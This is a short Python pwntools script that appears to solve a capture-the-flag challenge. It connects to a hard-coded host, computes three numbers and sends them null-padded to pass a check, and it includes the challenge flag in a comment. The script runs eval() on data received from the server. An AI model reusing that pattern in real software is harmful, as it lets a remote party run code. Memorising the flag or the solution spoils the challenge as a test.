#!/usr/bin/env python
from pwn import *

# pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3}

host , port = '159.89.166.12' , 9800
y = remote( host , port )

y.recvline()

a = eval( y.recvuntil( ' ; ' )[:-3] )
b = eval( y.recvuntil( ' ; ' )[:-3] )
c = eval( y.recvuntil( ' ;' )[:-2] )
print a , b , c

n = 0
n2 = 0
n3 = 0

for n in range( -20000 , 0 , 1 ):
        n2 = a - n
        n3 = c - n
        if n2 + n3 == b:
                print n , n2 , n3
                break


p = str( n ).ljust( 10 , '\0' )
p += str( n2 ).ljust( 10 , '\0' )
p += str( n3 ).ljust( 10 , '\0' )

print p

y.sendline( p )

y.interactive()